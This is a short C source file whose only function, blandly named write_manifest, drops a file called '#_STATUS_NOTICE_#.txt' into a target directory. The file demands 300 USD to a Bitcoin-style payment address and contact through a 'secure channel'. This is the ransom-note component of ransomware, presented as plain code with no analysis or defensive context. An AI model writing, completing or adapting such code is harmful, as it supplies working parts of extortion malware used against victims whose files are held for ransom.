#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <limits.h>

int write_manifest(const char *dir_path) {
    char filepath[PATH_MAX];
    FILE *file;

    snprintf(filepath, sizeof(filepath), "%s/#_STATUS_NOTICE_#.txt", dir_path);

    file = fopen(filepath, "w");
    if (!file) {
        return -1;
    }

    fprintf(file, "Please send 300 USD to payment address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and contact via secure channel.\n");

    fclose(file);

    return 0;
}